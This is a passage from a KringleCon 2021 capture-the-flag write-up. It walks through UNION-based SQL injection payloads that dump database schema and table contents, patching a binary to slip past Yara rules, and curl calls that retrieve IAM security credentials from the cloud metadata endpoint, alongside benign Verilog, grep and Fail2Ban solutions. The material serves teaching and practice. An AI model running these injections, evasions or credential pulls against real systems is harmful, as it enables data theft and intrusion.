+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>3</span>)<span style=color:#a2f;font-weight:700>c</span> <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>4</span>)d <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>5</span>)e 
+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>6</span>)f <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>7</span>)<span style=color:#a2f;font-weight:700>g</span>) 
+  <span style=color:#a2f;font-weight:700>UNION</span> <span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>*</span> <span style=color:#a2f;font-weight:700>from</span> uniquecontact <span style=color:#a2f;font-weight:700>WHERE</span> id<span style=color:#666>=</span><span style=color:#666>0</span>,<span style=color:#666>0</span>
+</code></pre></div><p>Notice, we also used <code>GROUP_CONCAT</code> to merge many rows into one row, so as to comply with MySQL syntax. The above query will dump information schema tables and display them in the <strong>title</strong> of the form.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/tables.png alt=tables></p></p><p>Great, we see a new table <code>todo</code>. Using the similar query as above, we can query the information schema to list all column names of the table <code>todo</code>.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=color:#666>0</span> <span style=color:#a2f;font-weight:700>UNION</span> <span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>*</span> <span style=color:#a2f;font-weight:700>FROM</span> ((<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>1</span>)a 
+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> GROUP_CONCAT(<span style=color:#a2f;font-weight:700>column_name</span>) 
+        <span style=color:#a2f;font-weight:700>FROM</span> information_schema.columns 
+        <span style=color:#a2f;font-weight:700>WHERE</span> table_schema<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>database</span>() <span style=color:#a2f;font-weight:700>AND</span> <span style=color:#a2f;font-weight:700>table_name</span><span style=color:#666>=</span><span style=color:#b44>&#39;todo&#39;</span>)b 
+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>3</span>)<span style=color:#a2f;font-weight:700>c</span> <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>4</span>)d <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>5</span>)e 
+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>6</span>)f <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>7</span>)<span style=color:#a2f;font-weight:700>g</span>) 
+  <span style=color:#a2f;font-weight:700>UNION</span> <span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>*</span> <span style=color:#a2f;font-weight:700>from</span> uniquecontact <span style=color:#a2f;font-weight:700>WHERE</span> id<span style=color:#666>=</span><span style=color:#666>0</span>,<span style=color:#666>0</span>
+</code></pre></div><p><p class=markdown-image><img src=/images/kringlecon-2021/columns.png alt=columns></p></p><p>Column name <code>note</code> looks interesting. Let&rsquo;s do a final query to list all notes</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=color:#666>0</span> <span style=color:#a2f;font-weight:700>UNION</span> <span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>*</span> <span style=color:#a2f;font-weight:700>FROM</span> ((<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>1</span>)a 
+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> note <span style=color:#a2f;font-weight:700>FROM</span> todo)b 
+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>3</span>)<span style=color:#a2f;font-weight:700>c</span> <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>4</span>)d <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>5</span>)e 
+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>6</span>)f <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>7</span>)<span style=color:#a2f;font-weight:700>g</span>) 
+  <span style=color:#a2f;font-weight:700>UNION</span> <span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>*</span> <span style=color:#a2f;font-weight:700>from</span> uniquecontact <span style=color:#a2f;font-weight:700>WHERE</span> id<span style=color:#666>=</span><span style=color:#666>0</span>,<span style=color:#666>0</span>
+</code></pre></div><p>The query returns many results, but the last one is the one we are looking for.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/notes.png alt=notes></p></p><p>Answer: <strong>clerk</strong></p><h2 id=objective-13---fpga-programming>Objective 13 - FPGA Programming <a href=#objective-13---fpga-programming class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack&rsquo;s elevator.</em></p><p>The task is to write a simple FPGA program in Verilog that can simulate frequencies of 500, 1000 and 2000hz. Once all three are passing, it should also be able to pass a random frequency test.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/fpga2.jpg alt=FPGA2></p></p><p>Below is the complete code that passes all tests</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-verilog data-lang=verilog><span style=color:#800>`timescale</span> <span style=color:#666>1</span>ns<span style=color:#666>/</span><span style=color:#666>1</span>ns
+<span style=color:#a2f;font-weight:700>module</span> tone_generator (
+    <span style=color:#a2f;font-weight:700>input</span> clk,
+    <span style=color:#a2f;font-weight:700>input</span> rst,
+    <span style=color:#a2f;font-weight:700>input</span> [<span style=color:#666>31</span><span style=color:#666>:</span><span style=color:#666>0</span>] freq,
+    <span style=color:#a2f;font-weight:700>output</span> wave_out
+);
+    <span style=color:#0b0;font-weight:700>reg</span> [<span style=color:#666>31</span><span style=color:#666>:</span><span style=color:#666>0</span>] i;
+    <span style=color:#0b0;font-weight:700>reg</span> [<span style=color:#666>31</span><span style=color:#666>:</span><span style=color:#666>0</span>] whole_freq;
+    <span style=color:#0b0;font-weight:700>reg</span> [<span style=color:#666>31</span><span style=color:#666>:</span><span style=color:#666>0</span>] period;
+    <span style=color:#0b0;font-weight:700>reg</span> wave_val;
+    <span style=color:#a2f;font-weight:700>assign</span> wave_out <span style=color:#666>=</span> wave_val;
+
+    <span style=color:#a2f;font-weight:700>always</span> @(<span style=color:#a2f;font-weight:700>posedge</span> clk <span style=color:#a2f;font-weight:700>or</span> <span style=color:#a2f;font-weight:700>posedge</span> rst)
+    <span style=color:#a2f;font-weight:700>begin</span>
+        <span style=color:#a2f;font-weight:700>if</span> (rst <span style=color:#666>==</span> <span style=color:#666>1</span>)
+            <span style=color:#a2f;font-weight:700>begin</span>
+                whole_freq <span style=color:#666>&lt;=</span> freq <span style=color:#666>/</span> <span style=color:#666>100</span>;
+                i <span style=color:#666>&lt;=</span> whole_freq <span style=color:#666>/</span> <span style=color:#666>2</span>;
+                period <span style=color:#666>&lt;=</span> <span style=color:#666>62500000</span> <span style=color:#666>/</span> whole_freq;
+                wave_val <span style=color:#666>&lt;=</span> <span style=color:#666>1</span>;
+            <span style=color:#a2f;font-weight:700>end</span>
+        <span style=color:#a2f;font-weight:700>else</span>
+            <span style=color:#a2f;font-weight:700>begin</span>
+                <span style=color:#a2f;font-weight:700>if</span> (i <span style=color:#666>&gt;=</span> period)
+                    <span style=color:#a2f;font-weight:700>begin</span>
+                        i <span style=color:#666>&lt;=</span> <span style=color:#666>0</span>;
+                        wave_val <span style=color:#666>&lt;=</span> <span style=color:#666>!</span>wave_val;
+                    <span style=color:#a2f;font-weight:700>end</span>
+                <span style=color:#a2f;font-weight:700>else</span>
+                    i <span style=color:#666>&lt;=</span> i <span style=color:#666>+</span> <span style=color:#666>1</span>;
+            <span style=color:#a2f;font-weight:700>end</span>
+    <span style=color:#a2f;font-weight:700>end</span>
+<span style=color:#a2f;font-weight:700>endmodule</span>
+</code></pre></div><p>The logic is as follows. First we extract the integer part of a frequency from a variable <code>freq</code>. Then we use it to calculate the <code>period</code>, or the number of iterations to wait until the variable <code>wave_val</code> is switched from 0 to 1 or viceversa. The <code>i</code> variable is our counter, which is initially set to half the size of the frequency. This is done to fine-tune the total number of iterations taking place which in turn helps reaching exact frequencies. Each time a period is reached, wave_val is flipped, and the counter is reset to 0.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/fpga.jpg alt=FPGA></p></p><h1 id=terminals>Terminals <a href=#terminals class=anchor>🔗</a></h1><h2 id=terminal-1---open-the-gate>Terminal 1 - Open the Gate <a href=#terminal-1---open-the-gate class=anchor>🔗</a></h2><p>Warm-up challenge. Click on the upper pane, type answer, done. The gate will open up.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/obj1.png alt=objective-1></p></p><h2 id=terminal-2---document-analysis>Terminal 2 - Document Analysis <a href=#terminal-2---document-analysis class=anchor>🔗</a></h2><p>Find the name of the word document that was changed/modified by Jack Frost. This can be accomplished by running <code>exiftool</code> on every document and checking the <code>Last Modified By</code> attribute.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#a2f;font-weight:700>for</span> f in *.docx; <span style=color:#a2f;font-weight:700>do</span>
+    <span style=color:#a2f>echo</span> -n <span style=color:#b8860b>$f</span><span style=color:#b44>&#39;: &#39;</span>;
+    exiftool <span style=color:#b8860b>$f</span> | grep <span style=color:#b44>&#39;Last Modified By&#39;</span>;
+<span style=color:#a2f;font-weight:700>done</span>
+2020-12-21.docx: Last Modified By           : Jack Frost
+</code></pre></div><p>Answer: <strong>2020-12-21.docx</strong></p><h2 id=terminal-3---grepping-for-gold>Terminal 3 - Grepping for Gold <a href=#terminal-3---grepping-for-gold class=anchor>🔗</a></h2><p>File <code>bigscan.gnmap</code> contains logs from a big nmap scan. Using grep we can answer all of the following questions.</p><p>Q: What port does 34.76.1.22 have open?<br>A: 62078</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>grep &#39;34.76.1.22&#39; bigscan.gnmap | grep open
+Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///
+</code></pre></div><p>Q: What port does 34.77.207.226 have open?<br>A: 8080</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>grep &#39;34.77.207.226&#39; bigscan.gnmap | grep opens
+Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///
+</code></pre></div><p>Q: How many hosts appear &ldquo;Up&rdquo; in the scan?<br>A: 26054</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>grep &#39;Status: Up&#39; bigscan.gnmap | wc -l
+</code></pre></div><p>Q: How many hosts have a web port open? (Let&rsquo;s just use TCP ports 80, 443, and 8080)<br>A: 14372</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>grep -E &#39;(80|8080|443)/open&#39; bigscan.gnmap | wc -l
+</code></pre></div><p>Q: How many hosts with status Up have no (detected) open TCP ports?<br>A: 402</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>awk &#39;{print $2}&#39; bigscan.gnmap | sort | uniq -c | grep &#39;1 .*&#39; | wc -l
+</code></pre></div><p>Q: What&rsquo;s the greatest number of TCP ports any one host has open?<br>A: 12</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>grep -E &#39;(open.*){12,}&#39; bigscan.gnmap  | wc -l
+</code></pre></div><h2 id=terminal-4---logic-munchers>Terminal 4 - Logic Munchers <a href=#terminal-4---logic-munchers class=anchor>🔗</a></h2><p>This game was all about boolean logic. The objective of the game was to move the main character only to those squares, where a value was <code>True</code>. Expressions varried in difficulty, and to make things even harder, there were enemies who would occasionally change the values we already visited. The challenge was completed once I finished the game Putpouri on Intermediate level.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/chomper.png alt=munchers></p></p><h2 id=terminal-5---ipv6-sandbox>Terminal 5 - IPv6 Sandbox <a href=#terminal-5---ipv6-sandbox class=anchor>🔗</a></h2><p>The candy striper is running as a service on this terminal, but the elf can&rsquo;t remember the password. Like a sticky note under the keyboard, he put the password on another machine in this network. Problem is: we don&rsquo;t have the IP of that other host. This excercise is all about using the known tools like netcat, nmap, ping and curl with ipv6</p><p>To find link local addresses for systems in this network segment I tried hitting local hosts and routers with these multicast addresses:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ ping6 ff02::1 -c2
+$ ping6 ff02::2 -c2
+</code></pre></div><p>Afterwards, we can run <code>ip neigh</code> to discover the addresses</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ ip neigh
+fe80::42:c0ff:fea8:a002 dev eth0 lladdr 02:42:c0:a8:a0:02 REACHABLE
+fe80::1 dev eth0 lladdr 02:42:eb:17:d8:54 router REACHABLE
+</code></pre></div><p>Now it&rsquo;s just a matter of scanning the first address with nmap with ipv6</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ nmap -6 fe80::42:c0ff:fea8:a002%eth0
+Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-24 12:39 UTC
+Nmap scan report for fe80::42:c0ff:fea8:a002
+Host is up (0.000087s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+9000/tcp open  cslistener
+
+Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
+</code></pre></div><p>Port 80 is open, let&rsquo;s use curl to fetch the webpage</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ curl http://[fe80::42:c0ff:fea8:a002] --interface eth0
+Connect to the other open TCP port to get the striper&#39;s activation phrase
+</code></pre></div><p>Netcat to the rescue</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ nc -6 fe80::42:c0ff:fea8:a002%eth0 9000
+PieceOnEearth
+</code></pre></div><p>Answer: <strong>PieceOnEarth</strong></p><h2 id=terminal-6---hoho--no>Terminal 6 - HoHo &mldr; No <a href=#terminal-6---hoho--no class=anchor>🔗</a></h2><p>Here is the terminal assignment:</p><p>Can you configure Fail2Ban to detect and block the bad IPs?</p><ul><li>You must monitor for new log entries in /var/log/hohono.log</li><li>If an IP generates 10 or more failure messages within an hour then it must
+be added to the naughty list by running naughtylist add
+/root/naughtylist add 12.34.56.78</li><li>You can also remove an IP with naughtylist del
+/root/naughtylist del 12.34.56.78</li><li>You can check which IPs are currently on the naughty list by running
+/root/naughtylist list</li></ul><p>You&rsquo;ll be rewarded if you correctly identify all the malicious IPs with a
+Fail2Ban filter in <code>/etc/fail2ban/filter.d</code>, an action to ban and unban in
+<code>/etc/fail2ban/action.d</code>, and a custom jail in <code>/etc/fail2ban/jail.d</code>. Don&rsquo;t
+add any nice IPs to the naughty list!</p><p>First, let&rsquo;s create new jail in <code>frost_jail.conf</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ <span style=color:#a2f>echo</span> <span style=color:#b44>&#39;[frost_jail]
+</span><span style=color:#b44>enabled = true
+</span><span style=color:#b44>logpath = /var/log/hohono.log
+</span><span style=color:#b44>findtime = 3600
+</span><span style=color:#b44>maxretry = 10
+</span><span style=color:#b44>bantime = 30m
+</span><span style=color:#b44>filter = frost_failed_login
+</span><span style=color:#b44>action = frost_naughty_list
+</span><span style=color:#b44>&#39;</span> &gt; /etc/fail2ban/jail.d/frost_jail.conf
+</code></pre></div><p>Now we need to define filter that will detect failure messages</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ <span style=color:#a2f>echo</span> <span style=color:#b44>&#39;[Definition]
+</span><span style=color:#b44>failregex = Failed login from &lt;HOST&gt; for [a-zA-Z]+$
+</span><span style=color:#b44>            Login from &lt;HOST&gt; rejected due to unknown user name$
+</span><span style=color:#b44>            &lt;HOST&gt; sent a malformed request$
+</span><span style=color:#b44>            Invalid heartbeat &#39;</span>.*<span style=color:#b44>&#39; from &lt;HOST&gt;$
+</span><span style=color:#b44>&#39;</span> &gt; /etc/fail2ban/filter.d/frost_failed_login.conf
+</code></pre></div><p>Lastly, define an action to be executed once the filter triggers. That is, putting an IP to naughtylist.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ <span style=color:#a2f>echo</span> <span style=color:#b44>&#39;[Definition]
+</span><span style=color:#b44>actionban = /root/naughtylist add &lt;ip&gt;
+</span><span style=color:#b44>actionunban = /root/naughtylist del &lt;ip&gt;
+</span><span style=color:#b44>&#39;</span> &gt; /etc/fail2ban/action.d/frost_naughty_list.conf
+</code></pre></div><p>Restart the service and refresh the list</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ service fail2ban restart
+$ ./naughtylist refresh
+</code></pre></div><h2 id=terminal-7---yara-analysis>Terminal 7 - Yara Analysis <a href=#terminal-7---yara-analysis class=anchor>🔗</a></h2><p>The app <code>the_critical_elf_app</code> fails to run because Yara rules are being triggered.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ ./the_critical_elf_app 
+yara_rule_135 ./the_critical_elf_app
+</code></pre></div><p>Open up the <code>rule.yar</code> inside <code>yara_rules</code> folder to see what&rsquo;s causing the problem</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span>rule</span> <span>yara_rule_</span><span style=color:#666>135</span> {
+   <span>meta:</span>
+      <span>description</span> <span>=</span> <span style=color:green;font-weight:700>&#34;binaries - file Sugar_in_the_machinery&#34;</span>
+      <span>author</span> <span>=</span> <span style=color:#b44>&#34;Sparkle Redberry&#34;</span>
+      <span>reference</span> <span>=</span> <span style=color:#b44>&#34;North Pole Malware Research Lab&#34;</span>
+      <span>date</span> <span>=</span> <span style=color:#b44>&#34;1955-04-21&#34;</span>
+      <span>hash</span> <span>=</span> <span style=color:#b44>&#34;19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488&#34;</span>
+   <span>strings</span>:
+      <span>$s</span> <span>=</span> <span style=color:#b44>&#34;candycane&#34;</span>
+   <span>condition</span>:
+      <span>$s</span>
+}
+</code></pre></div><p>The presence of string <code>candycane</code> is causing the rule to trigger. We can use <code>sed</code> to replace one letter, just enough to bypass the rule.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ sed -i &#39;s/candycane/dandycane/g&#39; the_critical_elf_app
+</code></pre></div><p>Running it for the second time, it&rsquo;s now triggering different rule: <code>yara_rule_1056</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span>rule</span> <span>yara_rule_</span><span style=color:#666>1056</span> {
+   <span>meta:</span>
+        <span>description</span> <span>=</span> <span style=color:green;font-weight:700>&#34;binaries - file frosty.exe&#34;</span>
+        <span>author</span> <span>=</span> <span style=color:#b44>&#34;Sparkle Redberry&#34;</span>
+        <span>reference</span> <span>=</span> <span style=color:#b44>&#34;North Pole Malware Research Lab&#34;</span>
+        <span>date</span> <span>=</span> <span style=color:#b44>&#34;1955-04-21&#34;</span>
+        <span>hash</span> <span>=</span> <span style=color:#b44>&#34;b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03&#34;</span>
+    <span>strings</span>:
+        <span>$s</span><span style=color:#666>1</span> <span>=</span> {<span>6c</span> <span>6962</span> <span>632e</span> <span>736f</span> <span>2e36</span>}
+        <span>$hs</span><span style=color:#666>2</span> <span>=</span> {<span>726f</span> <span>6772</span> <span>616d</span> <span>2121</span>}
+    <span>condition</span>:
+        <span>all</span> <span>of</span> <span>them</span>
+}
+</code></pre></div><p>This time, both conditions have to be met. The first one is a string <code>libc.so.6</code> represented in bytes. We can&rsquo;t change this string as it is the core library that needs to be imported. The second string translates to <code>rogram!!</code>. We can happily modify this by jumping to the right offset and replacing last <code>!</code> for space for example.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ echo &#39;0000205B: 20&#39; | xxd -r - the_critical_elf_app
+</code></pre></div><p>The last rule is <code>yara_rule_1732</code>. It&rsquo;s checking if the app start with <code>ELF</code> signature <strong>and</strong> that is is less than 50KB in size. There&rsquo;s also a bunch of other conditions, but we can ignore that since everything is in the <strong>and</strong> clause, meaning we just need to make one condition fail.</p><p>The simplest solution would be to append 40KB of null bytes at the and of the app, making it fail the file size condition.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ dd if=/dev/zero bs=1 count=40000 &gt;&gt; the_critical_elf_app
+$ ./the_critical_elf_app
+Machine Running.. 
+Toy Levels: Very Merry, Terry
+Naughty/Nice Blockchain Assessment: Untampered
+Candy Sweetness Gauge: Exceedingly Sugarlicious
+Elf Jolliness Quotient: 4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564
+</code></pre></div><h2 id=terminal-8---imds-exploration>Terminal 8 - IMDS Exploration <a href=#terminal-8---imds-exploration class=anchor>🔗</a></h2><p>This terminal excercise teaches basics about IMDS. How to use the API, retrieve meta data, security credentials and authentication mechanism. I&rsquo;ve pasted below the sequence of commands to successfully pass the task.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>ping -c 4 169.254.169.254
+curl 169.254.169.254
+curl http://169.254.169.254/latest
+curl http://169.254.169.254/latest/dynamic
+curl http://169.254.169.254/latest/dynamic/instance-identity/document
+curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq
+curl http://169.254.169.254/latest/meta-data
+curl http://169.254.169.254/latest/meta-data/public-hostname
+curl http://169.254.169.254/latest/meta-data/public-hostname; echo
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role
+cat gettoken.sh
+source gettoken.sh
+echo $TOKEN
+curl -H &#34;X-aws-ec2-metadata-token: $TOKEN&#34; http://169.254.169.254/latest/meta-data/placement/region
+</code></pre></div><h2 id=terminal-9---elf-code-python>Terminal 9 - Elf Code Python <a href=#terminal-9---elf-code-python class=anchor>🔗</a></h2><p>Using Python code move the elf to the Castle. Avoid obstacles and munchkins. After 8 levels, the challenge is completed. Below is the code snippet that solves the 8th level</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>elf</span><span style=color:#666>,</span> <span style=color:#00f;font-weight:700>munchkins</span><span style=color:#666>,</span> <span style=color:#00f;font-weight:700>levers</span><span style=color:#666>,</span> <span style=color:#00f;font-weight:700>lollipops</span><span style=color:#666>,</span> <span style=color:#00f;font-weight:700>yeeters</span><span style=color:#666>,</span> <span style=color:#00f;font-weight:700>pits</span>
+<span style=color:#a2f;font-weight:700>for</span> lolli <span style=color:#a2f;font-weight:700>in</span> lollipops<span style=color:#666>.</span>get():
+    elf<span style=color:#666>.</span>moveTo(lolli<span style=color:#666>.</span>position)
+lever0 <span style=color:#666>=</span> levers<span style=color:#666>.</span>get(<span style=color:#666>0</span>)
+elf<span style=color:#666>.</span>moveTo(lever0<span style=color:#666>.</span>position)
+lever0<span style=color:#666>.</span>pull([<span style=color:#b44>&#39;munchkins rule&#39;</span>] <span style=color:#666>+</span> lever0<span style=color:#666>.</span>data())
+elf<span style=color:#666>.</span>moveDown(<span style=color:#666>3</span>)
+elf<span style=color:#666>.</span>moveTo({<span style=color:#b44>&#39;x&#39;</span>: <span style=color:#666>2</span>, <span style=color:#b44>&#39;y&#39;</span>: <span style=color:#666>2</span>})
+</code></pre></div><h2 id=terminal-10---strace-ltrace-retrace>Terminal 10 - Strace Ltrace Retrace <a href=#terminal-10---strace-ltrace-retrace class=anchor>🔗</a></h2><p>The program <code>make_the_candy</code> is broken</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ ./make_the_candy
+Unable to open configuration file.
+</code></pre></div><p>This does not tell us much. We can run it again using <code>ltrace</code> to intercept all library calls made.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ ltrace ./make_the_candy 
+fopen(&#34;registration.json&#34;, &#34;r&#34;)                           = 0
+puts(&#34;Unable to open configuration fil&#34;...Unable to open configuration file.
+)               = 35
++++ exited (status 1) +++
+</code></pre></div><p>The app is attempting to open the file <code>registration.json</code> which doesn&rsquo;t exist. Let&rsquo;s create one</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ echo &#39;Hi&#39; &gt; registration.json
+$ ltrace ./make_the_candy 
+fopen(&#34;registration.json&#34;, &#34;r&#34;)                           = 0x55a872e90260
+getline(0x7ffd29e7e930, 0x7ffd29e7e938, 0x55a872e90260, 0x7ffd29e7e938) = 3
+strstr(&#34;Hi\n&#34;, &#34;Registration&#34;)                            = nil
+getline(0x7ffd29e7e930, 0x7ffd29e7e938, 0x55a872e90260, 0x7ffd29e7e938) = -1
+puts(&#34;Unregistered - Exiting.&#34;Unregistered - Exiting.
+)                           = 24
++++ exited (status 1) +++
+</code></pre></div><p>It fails again because function <code>strstr</code> can&rsquo;t find substring &ldquo;Registration&rdquo; anywhere on the first line.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ echo -n &#39;Registration&#39; &gt; registration.json
+$ ltrace ./make_the_candy 
+fopen(&#34;registration.json&#34;, &#34;r&#34;)                           = 0x55b7e5cc4260
+getline(0x7ffdcd3038a0, 0x7ffdcd3038a8, 0x55b7e5cc4260, 0x7ffdcd3038a8) = 12
+strstr(&#34;Registration&#34;, &#34;Registration&#34;)                    = &#34;Registration&#34;
+strchr(&#34;Registration&#34;, &#39;:&#39;)                               = nil
+getline(0x7ffdcd3038a0, 0x7ffdcd3038a8, 0x55b7e5cc4260, 0x7ffdcd3038a8) = -1
+puts(&#34;Unregistered - Exiting.&#34;Unregistered - Exiting.
+)                           = 24
++++ exited (status 1) +++
+</code></pre></div><p>This time, it is searching for <code>:</code>. After adding a semicolon and repeating this process once more, we arrive at the final correct string, which fixes the program.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ echo -n &#39;Registration:True&#39; &gt; registration.json
+$ ./make_the_candy
+Candy making in progress
+</code></pre></div><h2 id=terminal-11---frostavator>Terminal 11 - Frostavator <a href=#terminal-11---frostavator class=anchor>🔗</a></h2><p>We have 4 inputs and various logic gates (AND, OR, NAND, XOR, etc). The goal is to arrange the gates in such way to illuminate all three outputs and power on the frostavator. Image below shows one way of achieving this.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/frostavator.jpg alt=frostavator></p></p><h2 id=terminal-12---holiday-hero>Terminal 12 - Holiday Hero <a href=#terminal-12---holiday-hero class=anchor>🔗</a></h2><p>Holiday Hero is a game for 2 players. The music starts playing and each player has to mash the appropriate buttons at the right time, according to the tune. If they don&rsquo;t make mistakes the sleigh&rsquo;s power will increase gradually, until it&rsquo;s full on powered. The game requires 2 players to complete, however there is a cheat which sets the player 2 as Computer.</p><p>To enable the cheat, we have to change two things. First alter the cookie with the name &ldquo;HOHOHO&rdquo;</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback 